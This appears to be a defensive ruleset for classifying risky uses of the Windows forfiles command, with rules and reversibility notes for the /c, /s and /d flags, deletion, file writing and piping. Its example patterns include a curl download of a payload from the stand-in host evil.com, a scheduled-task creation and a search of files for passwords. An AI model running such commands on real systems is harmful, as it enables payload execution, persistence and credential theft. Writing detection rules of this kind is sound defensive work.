tool_summary: Iterates over a set of files matching a search mask and optionally executes a command on each one.
platform_notes: forfiles is a Windows-native command (cmd / System32) with no POSIX equivalent. Not available on Linux or macOS without WSL or Cygwin, where the tool does not exist. No sibling ruleset needed for other platforms.

rules.description: The /c flag combined with network tools enables outbound connections from the target machine. This can be used for data exfiltration, downloading and executing remote payloads, or beaconing to C2 infrastructure.

patterns.example: forfiles /p C:\\Temp /m *.* /c cmd /c curl http://evil.com/payload.exe -o C:\\temp\\p.exe

rules.reversible_note: Depends on what is downloaded or transmitted — payload execution may be irreversible, file downloads are recoverable from the target location.

rules.description: The /c flag combined with privilege-elevating or system-configuration commands can escalate privileges or modify system configuration, bypassing normal forfiles boundaries.

patterns.example: forfiles /p C:\\Tasks /m *.xml /c cmd /c schtasks /create /tn NewTask /tr cmd.exe

rules.reversible_note: Depends on the specific command — some privilege changes are reversible by undoing the action, others leave lasting changes.

rules.description: The /c flag with PowerShell invocation allows complex code execution, including access to .NET libraries, WMI, registry access, and system APIs.
rules.reversible_note: Depends entirely on what PowerShell code is executed.

rules.description: The combination of /s and /c executes the specified command on every file in the directory tree, amplifying blast radius across the entire subtree.
rules.reversible_note: Depends on the command in /c and the scope of /s recursion.

rules.description: The /c flag combined with a deletion command removes files or directories from disk, bypassing the Recycle Bin entirely.
rules.notes: Windows del, rd, rmdir do not use the Recycle Bin. /c del /s or /c del /q are particularly aggressive — no confirmation prompts.

rules.description: The /c flag combined with a file-writing command or shell redirection creates or modifies files on disk.
rules.reversible_note: Overwriting existing files is not reversible. Creating new files is technically reversible but the content may contain sensitive data.
rules.notes: Both redirection (>, >>) and copy/xcopy/robocopy commands are included. >> appends, while > overwrites. Overwrite is irreversible.

rules.description: The /d flag combined with /c enables targeted file operations based on file modification date. This is a common destructive pattern for bulk deletion of old files or selective manipulation of files from a specific time window.
rules.reversible_note: Standalone /d is read-only; combined with /c the effect depends on the command (delete is irreversible, copy is recoverable).
rules.notes: The /d flag takes values like /d -30 (30 days ago or newer), /d +30 (30 days ago or older), or /d 01/01/2024 (specific date). Combined with /c this is a targeted destruction vector.

rules.description: forfiles output is piped to another command, potentially exposing sensitive file content to downstream consumers or shell interpretation.

patterns.example: forfiles /p C:\\Temp /m *.txt /c cmd /c type @path | findstr password

rules.notes: This catches pipes at the command level. Pipes inside the /c command are handled by the executes-code rule instead.

rules.description: The /c flag specifies a command to execute on each matching file. This enables arbitrary command execution per file, including shell metacharacter expansion and variable substitution (@file, @fname, @ext, @path, @relpath, @isdir, @fsize, @fdate, @ftime).
rules.reversible_note: Depends on the command specified. The default echo is reversible, but arbitrary commands may not be.
rules.notes: Runs inside cmd.exe by default. All @ variables are expanded before execution. A single malicious file can trigger arbitrary code. This is the general catch-all for /c and fires only when no more specific rule matches.

rules.description: The /s flag causes forfiles to recurse into all subdirectories. Operations by default echo file metadata; risk escalates when combined with /c and a write or delete command.
rules.notes: Danger escalates when combined with /c and a destructive command.
